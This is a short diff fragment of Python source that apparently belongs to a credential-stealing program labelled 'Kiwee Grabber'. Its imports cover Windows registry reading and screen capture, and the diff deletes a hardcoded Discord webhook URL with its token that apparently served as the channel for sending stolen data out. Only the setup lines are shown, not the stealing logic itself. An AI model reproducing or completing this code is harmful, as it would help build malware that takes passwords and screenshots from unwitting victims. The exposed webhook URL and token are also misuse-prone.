@@ -47,8 +47,6 @@ from urllib.request import Request, urlopen
 from winreg import HKEY_CURRENT_USER, OpenKey, EnumValue
 from PIL import ImageGrab
 
-webhookw = 'https://discord.com/api/webhooks/969831453682696192/HmCIglz5kIb1NyeS3zfKnVczD7q42GzQ1wfoDWGmXmcwMngtzMpgZPN80i-mH_pCiA1x'
-
 class Password:
     def __init__(self):
         self.dataz = "=== Kiwee Grabber ==="
